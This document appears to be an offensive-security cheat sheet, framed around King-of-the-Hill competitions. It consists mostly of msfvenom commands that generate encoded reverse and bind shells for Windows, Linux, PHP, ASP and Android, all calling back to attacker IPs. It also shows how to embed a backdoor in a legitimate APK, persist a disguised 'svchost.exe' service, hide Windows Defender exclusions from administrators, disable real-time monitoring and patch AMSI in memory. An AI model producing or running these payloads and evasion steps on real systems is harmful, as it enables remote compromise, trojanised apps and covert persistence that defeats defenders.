# WINDOWS ENCODED PAYLOADS  PORT 443
**====CHANGE. IP. AS. NEEDED.====**

# Reverse vs Bind Shell

| | **Reverse** | **Bind** |
|---|---|---|
| **Who initiates** | Target → Attacker (target dials out) | Attacker → Target (attacker dials in) |
| **Firewall** | Works through outbound-only firewalls (port 443 out) | Requires inbound port open on target |
| **NAT** | Works behind NAT (target punches through) | Fails if target is behind NAT |
| **Use case** | Exploits, webshells, anything where target can reach you | Pivots, compromised boxes with open inbound ports, KoTH |
| **Example** | `msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.67 LPORT=443` | `msfvenom -p windows/x64/shell_bind_tcp LPORT=1234` |

Rule of thumb: If the target can reach you → reverse. If you can reach the target directly → bind.

# Staged vs Stageless
The slash vs underscore in the payload name is the entire distinction:

| | **Staged** (`/`) | **Stageless** (`_`) |
|---|---|---|
| **Name format** | `windows/meterpreter/reverse_tcp` | `windows/meterpreter_reverse_tcp` |
| **How it works** | Tiny stager (~500B) executes → connects to handler → handler sends full payload into memory | Entire payload is in the file; executes and connects in one step |
| **File size** | Small (stager only) | Large (200–500+ KB) |
| **Network after exec** | Second stage downloaded over the connection | Nothing — already complete |
| **Requires** | `multi/handler` with **exact** payload match | Any listener (even `nc` for simple shells) |
| **Best for** | Buffer overflows, SQLi, tight size constraints | Standalone delivery (USB, file upload), unstable networks |
| **Detection** | EDR sees a second-stage download into memory | EDR sees one large blob on disk |

The golden rule: your handler's set payload must exactly match what you generated.  windows/x64/meterpreter/reverse_tcp (staged) ≠ windows/x64/meterpreter_reverse_tcp (stageless). Mismatch = no session.


## WINDOWS/SHELL/REVERSE_TCP [PORT 443]
```sh
msfvenom -p windows/shell/reverse_tcp LHOST=10.0.0.67 LPORT=443 --platform windows -a x86 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o reverse_encoded_86.exe
```

## WINDOWS/SHELL_REVERSE_TCP (NETCAT x86) [PORT 443]
```sh
msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.67 LPORT=443 --platform windows -a x86 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o reverse_encoded_86.exe
```

## WINDOWS/SHELL_REVERSE_TCP (NETCAT x64) [PORT 443]
```sh
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.67 LPORT=443 --platform windows -a x64 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o reverse_encoded_86.exe
```

## WINDOWS/METERPRETER/REVRESE_TCP (x86) [PORT 443] AT 10.0.0.67:
```sh
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.67 LPORT=443 --platform windows -a x86 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o reverse_encoded_86.exe
```

## WINDOWS/METERPRETER/REVRESE_TCP (x64) [PORT 443] AT 10.0.0.67:
```sh
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.67 LPORT=443 --platform windows -a x64 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o reverse_encoded_64.exe
```

## ---===BIND SHELL, ENCODED, ON PORT 1234===---

Note: shell_bind_tcp (underscore) = stageless. shell/bind_tcp or meterpreter/bind_tcp (slash) = staged. For a bind shell, the target is the listener. You just need its IP to connect: nc <target ip> port

```sh
msfvenom -p windows/shell_bind_tcp LPORT=1234 --platform windows -a x86 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o bindshell_1234_encoded_86.exe
```

## Windows x86 (staged)
```sh
msfvenom -p windows/meterpreter/bind_tcp LPORT=4444 -f exe -o bind.exe
```
## Windows x64 (stageless)
```sh
msfvenom -p windows/x64/shell_bind_tcp LPORT=4444 -f exe -o bind64.exe
```

## Linux x86 (staged)

```sh
msfvenom -p linux/x86/meterpreter/bind_tcp LPORT=4444 -f elf -o bind.elf
```

## Linux x64 (stageless)
```sh
msfvenom -p linux/x64/shell_bind_tcp LPORT=4444 -f elf -o bind64.elf
```

## Generic (any arch)
```sh
msfvenom -p generic/shell_bind_tcp LPORT=4444 -f raw -o bind.raw
```

## Bind Shell Persistence on Windows
The bind shell is just a .exe that listens on a port. Persistence = making sure it auto-starts after reboot or if a defender kills the process.

| Method | Command (on target) | Survives reboot? |
|---|---|---|
| **Registry Run key** | `reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v UpdateSvc /t REG_SZ /d "C:\ProgramData\bind.exe" /f` | ✅ |
| **Startup folder** | `copy bind.exe "C:\Users\Public\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"` | ✅ |
| **Scheduled Task** | `schtasks /create /tn "SysHealthCheck" /tr "C:\ProgramData\bind.exe" /sc onstart /ru SYSTEM` | ✅ |
| **Windows Service** | `sc create BindSvc binPath= "C:\ProgramData\bind.exe" start= auto` + `sc start BindSvc` | ✅ |
| **WMI Event Sub** | `wmic /namespace:\\root\subscription /node:target call create __EventFilter ...` | ✅ (stealthiest) |


## Recommended KoTH Setup

```sh
# 1. Generate the bind shell (from previous conversation)
msfvenom -p windows/meterpreter/bind_tcp LPORT=4444 -f exe \
  -e x86/shikata_ga_nai -i 5 \
  -x /usr/share/windows-binaries/plink.exe \
  -o bind.exe

# 2. Upload to target (via your existing access)
# Place in a "legit-looking" location:
# C:\ProgramData\svchost.exe   (looks like a system file)

# 3. Persist via service (most reliable):
sc create "WindowsUpdateService" binPath= "C:\ProgramData\svchost.exe" start= auto
sc start "WindowsUpdateService"

# 4. Lock the file:
# (from your Linux box, if you have SMB/other access)
# Or via PowerShell on target:
powershell -c "Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\WindowsUpdateService' -Name Start -Value 2"   
```

## Why Bind Shell Persistence Is Easier Than Reverse


| Concern | Reverse Shell | Bind Shell |
|---|---|---|
| **LHOST dependency** | If your IP changes, all reverse shells break | **No LHOST** — it just listens. You connect whenever you want. |
| **NAT/firewall** | Target must reach you | You must reach target (easier on KoTH LAN) |
| **Defender detection** | Outbound connection to external IP = obvious | Inbound listener on a random port = looks like a service |
| **Reconnect** | Target must re-execute to dial out | Just `nc target 4444` again — it's already listening |



## Code for encoding:
```sh
msfvenom --platform windows -a x86 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o payload_86.exe
```

================================================================================
# LINUX 
#### LINUX/x86/METERPRETER/REVERSE_TCP
```sh
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.0.0.67 LPORT=9997 -f elf >reverse.elf
```

# NETCAT
```sh
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.0.0.67 LPORT=1234 -f elf >reverse.elf
```
================================================================================

# PHP 
#### PHP/METERPRETER_REVERSE_TCP [PORT 443]
```sh
msfvenom -p php/meterpreter_reverse_tcp LHOST=10.0.0.67 LPORT=443 -f raw > shell.php
cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
```
## PHP/METERPRETER/REVERSE_TCP [PORT 443]
```sh
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.0.0.67 LPORT=443 -f raw > shell.php
cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
```

## PHP/REVERSE_PHP [PORT 443]
```sh
msfvenom -p php/reverse_php LHOST=10.0.0.67 LPORT=443 -f raw > shell.php
cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> 
shell.php
```
================================================================================

# ASP
#### ASP-REVERSE-PAYLOAD [PORT 443]
```sh
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.67 LPORT=443 -f asp > shell.asp
```
## OR FOR NETCAT [PORT 443]
```sh
msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.67 LPORT=443 -f asp > shell.asp
```
================================================================================
## Client-Side, Unicode Payload - For use with Internet Explorer and IE
```sh
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.30.5 LPORT=443 -f js_le -e generic/none
```

- Note: To keep things the same size, if needed add NOPs at the end of the payload.
### A Unicode NOP is - %u9090

# SHELLCODE GENERATION:

```sh
msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.67 LPORT=80 EXITFUNC=thread -f python -a x86 --platform windows -b '\x00' -e x86/shikata_ga_nai
```

## DLL HiJacking - Windows - x64
```sh
msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=192.168.45.190 LPORT=4444 -f dll -o Printconfig.dll
```
```sh
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.9.47.29 LPORT=4444 -f powershell
```


# ANDROID PAYLOADS
```sh
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.0.105 LPORT=4444 -o /root/Desktop/backdoor.apk
```
## Add encoding for Evasion
```sh
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.0.105 LPORT=4444 -e x86/shikata_ga_nai -i 3 -o /root/Desktop/encoded_backdoor.apk
```
msfvenom --list encoders
msfvenom --list payloads | grep android

# Embed payload into original apk
```sh
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.43.1 LPORT=4444 -x fruit_ninja.apk -e x86/shikata_ga_nai -i 3 -o /home/cyberxploit/Desktop/projects/fruit_ninjaa.apk
```
https://medium.com/@elijahchimera01/embedding-metasploit-payloads-into-legit-android-apps-ad75ab6199c6


## Bypassing Windows Defender for Custom Services
1. Add Exclusions (Most Effective)
The MDAV exclusion key (HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions) is kernel-locked — even SYSTEM can't write it directly.  Use the GPO path instead:

```sh
# Exclude your service path
New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths" -Name "C:\ProgramData\svchost.exe" -Force
New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths" -Name "C:\ProgramData\svchost.exe" -Value 0 -PropertyType DWord -Force

# Or exclude by extension (nuclear option)
New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Extensions" -Name ".exe" -Value 0 -PropertyType DWord -Force

# Or exclude by process name
New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Processes" -Name "svchost.exe" -Value 0 -PropertyType DWord -Force

# Apply
gpupdate /force   
```

Then hide the exclusions from defenders:

```sh
New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "HideExclusionsFromLocalAdmins" -Value 1 -PropertyType DWord -Force   
```
Now 
```sh
Get-MpPreference | Select ExclusionPath
```
 returns empty — even as SYSTEM. They'd have to read the raw registry to find it.


2. Make the Service Look Legitimate

| Trick | Example |
|---|---|
| **Name it like a system service** | `sc create "WMI Provider Host" ...` instead of `sc create "BindSvc" ...` |
| **Place in a system path** | `C:\Windows\System32\Tasks\` or `C:\ProgramData\` |
| **Name the exe innocuously** | `svchost.exe`, `msiexec.exe`, `spoolsv.exe` |
| **Use a legit template** | Your `plink.exe` template already helps — `file` check shows PuTTY |
| **Set a valid description** | `sc description "WMI Provider Host" "Windows Management Instrumentation service"` |


3. Disable Real-Time Monitoring (Nuclear)
```sh
Set-MpPreference -DisableRealtimeMonitoring $true   
```
This is loud — a defender checking Get-MpComputerStatus will see it. Use only as a last resort or combined with the exclusion approach.

4. AMSI Bypass (For PowerShell Delivery)
If you're delivering the service creation via PowerShell and Defender blocks the script:

```sh
# Patch AMSI in memory (one-liner)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)   
```

Or use AMSITrigger to find which strings trigger detection, then obfuscate those specific strings (base64, concat, reverse). 

```sh
# 1. Hide from Defender
New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths" -Name "C:\ProgramData\WmiPrvSE.exe" -Value 0 -PropertyType DWord -Force
New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "HideExclusionsFromLocalAdmins" -Value 1 -PropertyType DWord -Force

# 2. Create service with legit-looking name
sc create "WMI Provider Host" binPath= "C:\ProgramData\WmiPrvSE.exe" start= auto
sc description "WMI Provider Host" "Windows Management Instrumentation service"
sc start "WMI Provider Host"

# 3. Lock the binary
icacls "C:\ProgramData\WmiPrvSE.exe" /deny "Users:(W)"
icacls "C:\ProgramData\WmiPrvSE.exe" /deny "Users:(D)"

# 4. Persist the exclusion (in case defender reboots)
# Add to your existing scheduled task or cron:
# * * * * * reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths" /v "C:\ProgramData\WmiPrvSE.exe" /t REG_DWORD /d 0 /f   
```
